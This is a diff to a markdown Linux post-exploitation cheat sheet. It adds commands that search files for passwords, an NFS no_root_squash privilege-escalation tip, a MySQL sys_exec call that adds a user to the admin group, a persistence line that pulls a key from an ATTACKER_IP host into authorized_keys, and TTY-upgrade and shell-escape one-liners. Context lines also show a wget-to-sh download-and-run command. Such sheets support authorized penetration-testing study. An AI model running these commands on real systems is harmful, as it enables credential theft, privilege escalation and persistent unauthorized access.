@@ -17,6 +17,7 @@
 - [Maintaining control](#maintain)
     - [Reverse Shell](#rev_shell)
     - [Execute a Remote Script](#remote_script)
+    - [TTY]
 
 
 
@@ -249,6 +250,11 @@ things to pull when all you can do is blindly read like in LFI/dir traversal (Do
 * locate .xml | grep [.]xml # java/.net config files
 * find /sbin /usr/sbin /opt /lib \`echo $PATH | ‘sed s/:/ /g’\` -perm /6000  -ls # find suids
 * locate rhosts
+* `grep -i user [filename]`  
+* `grep -i pass [filename]`  
+* `grep -C 5 "password" [filename]`  
+* `find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"`
+
 
 Also, check http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf for some one-liners that find world writable directories/files and more.
 
@@ -268,8 +274,16 @@ Also, check http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf
 * lsof -nPi
 * ls /home/\*/.ssh/*
 
+If /etc/exports if writable, you can add an NFS entry or change and existing entry adding the no_root_squash flag to a root directory, put a binary with SUID bit on, and get root.
+
+MySQL   
+`sys_exec('usermod -a -G admin username')`
+
 <a name="maintain"/><a>
 ## Maintaining control
+
+Add public key to authorized keys  
+`echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys`
 
 <a name="rev_shell"/><a>
 ### Reverse Shell
@@ -292,4 +306,25 @@ Starting list sourced from: http://pentestmonkey.net/cheat-sheet/shells/reverse-
 `wget http://server/file.sh -O- | sh`  
 This command forces the download of a file and immediately its execution
 
+### TTY Shell
 
+`python -c 'import pty;pty.spawn("/bin/bash")'`
+
+Set PATH TERM and SHELL if missing:
+`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`  
+`export TERM=xterm`  
+`export SHELL=bash`  
+
+### Escape Limited Shell
+
+`echo os.system('/bin/bash')`  
+`/bin/sh -i`  
+`exec "/bin/sh";`  
+`perl —e 'exec "/bin/sh";'`  
+
+
+
+
+Referances:
+https://guif.re/linuxeop
+https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List#paths
